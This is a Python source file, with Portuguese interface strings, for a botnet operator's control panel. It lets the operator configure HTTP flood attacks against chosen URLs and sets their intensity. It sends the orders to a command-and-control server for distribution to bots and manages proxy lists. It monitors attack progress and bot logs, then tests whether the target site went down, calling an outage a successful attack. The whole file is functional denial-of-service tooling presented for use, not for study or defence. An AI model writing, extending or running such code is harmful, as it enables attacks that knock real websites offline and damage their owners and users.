import requests
import time
import os
import json

C2_URL = "http://localhost:5000"
PROXIES = []
ATTACKS = {}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_proxies_from_file(filepath):
    global PROXIES
    try:
        with open(filepath, 'r') as f:
            PROXIES = [line.strip() for line in f if line.strip()]
        print(f"[+] {len(PROXIES)} proxies carregados com sucesso!")
        return True
    except FileNotFoundError:
        print(f"[!] Arquivo nao encontrado: {filepath}")
        return False
    except Exception as e:
        print(f"[!] Erro ao carregar proxies: {e}")
        return False

def load_attacks_from_file(filepath=None):
    """Carrega ataques pré-configurados de um arquivo JSON"""
    global ATTACKS
    if filepath is None:
        filepath = os.path.join(os.path.dirname(__file__), '..', 'attacks.json')
    try:
        with open(filepath, 'r') as f:
            ATTACKS = json.load(f)
        print(f"[+] {len(ATTACKS)} ataques pré-configurados carregados!")
        for key, attack in ATTACKS.items():
            print(f"   - {key}: {attack.get('name', 'Sem nome')}")
        return True
    except FileNotFoundError:
        print(f"[!] Arquivo {filepath} nao encontrado")
        return False
    except Exception as e:
        print(f"[!] Erro ao carregar ataques: {e}")
        return False

def execute_prebuilt_attack():
    """Executa um ataque pré-configurado"""
    if not ATTACKS:
        print("[!] Nenhum ataque pré-configurado carregado. Use opcao 3 primeiro.")
        return

    print("\n--- ATAQUES DISPONÍVEIS ---")
    for i, (key, attack) in enumerate(ATTACKS.items(), 1):
        urls = attack.get('urls', [])
        intensity = attack.get('intensity', 100)
        print(f"{i}. {attack.get('name', key)}")
        print(f"   URLs: {len(urls)} | Intensidade: {intensity}")

    try:
        choice = int(input("\nEscolha o ataque (numero): ")) - 1
        attack_key = list(ATTACKS.keys())[choice]
        attack_config = ATTACKS[attack_key]
    except (ValueError, IndexError):
        print("[!] Opcao invalida")
        return

    print(f"\n[*] Iniciando: {attack_config.get('name', attack_key)}")
    intensity = attack_config.get("intensity", 100)
    urls = attack_config.get("urls", [])

    if not urls or len(urls) == 0:
        print("[!] Ataque sem URLs")
        return

    if len(urls) > 5:
        print(f"[!] Maximo 5 URLs. Usando apenas as 5 primeiras.")
        urls = urls[:5]

    requests_list = [{"url": url, "method": "GET", "headers": {}, "body": None} for url in urls]

    payload = {
        "action": "flood",
        "requests": requests_list,
        "intensity": intensity
    }

    try:
        print(f"[*] Enviando ataque para o C2...")
        resp = requests.post(f"{C2_URL}/admin/send_command", json=payload, timeout=5)
        if resp.status_code == 200:
            attack_data = resp.json()
            attack_id = attack_data.get('attack_id')
            num_reqs = attack_data.get('num_requests', len(requests_list))
            num_bots = attack_data.get('num_bots', 100)
            total_expected = attack_data.get('total_expected_requests', 0)
            print(f"[+] Ataque iniciado! ID: {attack_id}")
            print(f"[+] URLs: {num_reqs} x Intensidade: {intensity} x Bots: {num_bots}")
            print(f"[+] TOTAL ESPERADO: {total_expected} requisicoes")

            monitor_attack(attack_id, urls[0])
        else:
            resp_data = resp.json()
            print(f"[!] Erro do servidor: {resp_data.get('message', resp.status_code)}")
    except Exception as e:
        print(f"[-] Erro de conexao: {e}")

def menu():
    print("\n" + "="*55)
    print("   BOTNET CONTROL PANEL v1.0 - ATAQUES PRE-BUILD")
    print("="*55)
    print("1. Iniciar Ataque DDoS (Customizado)")
    print("2. Carregar Arquivo de Proxies")
    print("3. Carregar Ataques Pre-Configurados")
    print("4. Executar Ataque Pre-Build")
    print("5. Monitorar Logs (Real-time)")
    print("6. Sair")
    return input("Escolha uma opcao: ")

def add_request():
    """Adiciona uma requisicao ao ataque"""
    print("\n--- CONFIGURACAO DE REQUISICAO ---")
    url = input("URL (ex: http://target-server/api/endpoint): ").strip()
    if not url:
        print("[!] URL nao pode estar vazia.")
        return None

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
        print(f"[*] URL ajustada para: {url}")

    method = input("Metodo HTTP (GET/POST/PUT) [padrao: GET]: ").strip().upper() or "GET"
    if method not in ["GET", "POST", "PUT"]:
        print("[!] Metodo invalido. Usando GET.")
        method = "GET"

    headers_input = input("Headers customizados? (JSON, opcional, ex: {\"X-Custom\": \"value\"}): ").strip()
    headers = {}
    if headers_input:
        try:
            import json
            headers = json.loads(headers_input)
        except Exception as e:
            print(f"[!] Headers invalido ({e}). Ignorando.")

    body = None
    if method in ["POST", "PUT"]:
        body = input("Body/Payload (opcional): ").strip() or None

    return {
        "url": url,
        "method": method,
        "headers": headers,
        "body": body
    }

def attack_ddos():
    print("\n" + "="*40)
    print("   CONFIGURACAO DE ATAQUE")
    print("="*40)

    requests_list = []
    print("\nAdicione ate 5 requisicoes para o ataque:")

    req_num = 1
    while req_num <= 5:
        print(f"\n[Requisicao {req_num}]")
        req = add_request()

        if not req:
            print("[!] Requisicao invalida. Tente novamente.")
            continue

        requests_list.append(req)
        print(f"[+] Requisicao {req_num} adicionada: {req['method']} {req['url']}")

        if req_num < 5:
            add_more = input("\nAdicionar outra requisicao? (s/n) [padrao: n]: ").strip().lower()
            if add_more != 's':
                break

        req_num += 1

    if not requests_list:
        print("[!] Nenhuma requisicao configurada. Cancelando ataque.")
        return

    print(f"\n[OK] Total de {len(requests_list)} requisicao(oes) configurada(s)")
    print("\n--- RESUMO DAS REQUISICOES ---")
    for i, req in enumerate(requests_list, 1):
        print(f"{i}. {req['method']} {req['url']}")
        if req['body']:
            print(f"   Body: {req['body'][:50]}...")
        if req['headers']:
            print(f"   Headers: {req['headers']}")

    try:
        intensity = int(input("\nIntensidade (quantas vezes executar cada requisicao): "))
        if intensity <= 0:
            intensity = 1
    except ValueError:
        print("[!] Intensidade deve ser um numero. Usando 1.")
        intensity = 1

    payload = {
        "action": "flood",
        "requests": requests_list,
        "intensity": intensity
    }

    try:
        print("\n[*] Enviando comando para o C2...")
        resp = requests.post(f"{C2_URL}/admin/send_command", json=payload, timeout=5)
        if resp.status_code == 200:
            attack_data = resp.json()
            attack_id = attack_data.get('attack_id')
            num_reqs = attack_data.get('num_requests', len(requests_list))
            num_bots = attack_data.get('num_bots', 100)
            total_expected = attack_data.get('total_expected_requests', 0)
            print(f"[+] Ataque iniciado! ID: {attack_id}")
            print(f"[+] Requisicoes: {num_reqs} x Intensidade: {intensity} x Bots: {num_bots}")
            print(f"[+] TOTAL ESPERADO: {total_expected} requisicoes")

            monitor_attack(attack_id, requests_list[0].get('url'))
        else:
            resp_data = resp.json()
            print(f"[!] Erro do servidor: {resp_data.get('message', resp.status_code)}")
    except Exception as e:
        print(f"[-] Erro de conexao: {e}")

def monitor_attack(attack_id, target_url):
    print("\n" + "="*50)
    print("   MONITORAMENTO DE ATAQUE EM TEMPO REAL")
    print("="*50)

    attack_completed = False
    start_time = time.time()

    try:
        while not attack_completed:
            clear_screen()
            print("=" * 50)
            print("   MONITORAMENTO DE ATAQUE EM TEMPO REAL")
            print("=" * 50)
            print(f"\nID do Ataque: {attack_id}")
            print(f"Tempo decorrido: {int(time.time() - start_time)}s\n")

            try:
                resp = requests.get(f"{C2_URL}/get_attack_status/{attack_id}", timeout=5)
                if resp.status_code == 200:
                    attack_info = resp.json()

                    print(f"Status: {attack_info.get('status', 'unknown')}")
                    print(f"Requisicoes Enviadas: {attack_info.get('requests_sent', 0)}")
                    print(f"Requisicoes Bem-sucedidas: {attack_info.get('requests_successful', 0)}")
                    print(f"Requisicoes Falhadas: {attack_info.get('requests_failed', 0)}")

                    proxy_stats = attack_info.get('proxy_stats', {})
                    if proxy_stats:
                        print("\n--- DISTRIBUICAO DE PROXIES ---")
                        for proxy, stats in proxy_stats.items():
                            sucesso = stats.get("sucesso", 0)
                            falha = stats.get("falha", 0)
                            total = sucesso + falha
                            taxa = (sucesso / total * 100) if total > 0 else 0
                            proxy_name = proxy if proxy else "DIRETO (sem proxy)"
                            print(f"[{proxy_name}] {sucesso}/{total} ({taxa:.1f}%)")

                    if attack_info.get('status') == 'completed':
                        attack_completed = True
                        print("\n[+] Ataque concluído! Aguarde análise de acessibilidade...")
            except:
                pass

            if not attack_completed:
                time.sleep(2)

        print("\n" + "="*50)
        print("   ANÁLISE DE EFETIVIDADE")
        print("="*50)

        print(f"\n[*] Testando acessibilidade de {target_url}...")
        time.sleep(2)

        try:
            test_response = requests.get(target_url, timeout=10)

            if test_response.status_code == 200:
                print(f"\n[!] STATUS: SITE AINDA ACESSÍVEL ❌")
                print(f"    Código HTTP: {test_response.status_code}")
                print(f"    Tempo de resposta: {test_response.elapsed.total_seconds():.2f}s")
                print(f"    Efetividade: 0% - Ataque não teve efeito esperado")
            elif test_response.status_code >= 500:
                print(f"\n[+] STATUS: SITE INDISPONÍVEL ✓")
                print(f"    Código HTTP: {test_response.status_code}")
                print(f"    Efetividade: 100% - Ataque bem-sucedido!")
            else:
                print(f"\n[?] STATUS: RESPOSTA ANÔMALA ⚠")
                print(f"    Código HTTP: {test_response.status_code}")
                print(f"    Efetividade: Parcial - Site retornou status inesperado")

        except requests.exceptions.Timeout:
            print(f"\n[+] STATUS: SITE INDISPONÍVEL ✓")
            print(f"    Erro: Timeout na requisição")
            print(f"    Efetividade: 100% - Ataque bem-sucedido!")

        except requests.exceptions.ConnectionError:
            print(f"\n[+] STATUS: SITE INDISPONÍVEL ✓")
            print(f"    Erro: Impossível conectar")
            print(f"    Efetividade: 100% - Ataque bem-sucedido!")

        except Exception as e:
            print(f"\n[?] Erro ao testar acessibilidade: {e}")

        print("\n" + "="*50)
        input("\nPressione Enter para retornar ao menu...")

    except KeyboardInterrupt:
        print("\n[*] Monitoramento cancelado pelo usuário.")

def monitor_logs():
    print("\n[*] Conectando ao stream de logs... (Ctrl+C para parar)")
    try:
        while True:
            resp = requests.get(f"{C2_URL}/admin/get_logs", timeout=5)
            logs = resp.json()

            if not logs:
                print("[!] Sem logs no momento...")
            else:
                clear_screen()
                print("\n" + "="*50)
                print("   MONITORAMENTO DE ATIVIDADE DA BOTNET")
                print("="*50)
                print(f"Total de eventos: {len(logs)}\n")
                print("-" * 50)

                for log in logs[-15:]:
                    ts = log.get('timestamp', '??:??:??')
                    bot = log.get('bot_id', '??')
                    msg = log.get('message', '...')
                    print(f"[{ts}] [{bot}] {msg}")

            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Monitoramento encerrado.")
    except Exception as e:
        print(f"[!] Erro no monitoramento: {e}")

def main():
    print("[*] Carregando ataques pré-configurados...")
    load_attacks_from_file()

    while True:
        choice = menu()
        if choice == '1':
            attack_ddos()
        elif choice == '2':
            filepath = input("Caminho do arquivo de proxies (ex: proxies.txt): ").strip()
            if load_proxies_from_file(filepath):
                print(f"[+] Proxies prontos para usar nos ataques!")
        elif choice == '3':
            load_attacks_from_file()
        elif choice == '4':
            execute_prebuilt_attack()
        elif choice == '5':
            monitor_logs()
        elif choice == '6':
            print("[*] Encerrando...")
            break
        else:
            print("[!] Opcao invalida.")

if __name__ == "__main__":
    main()
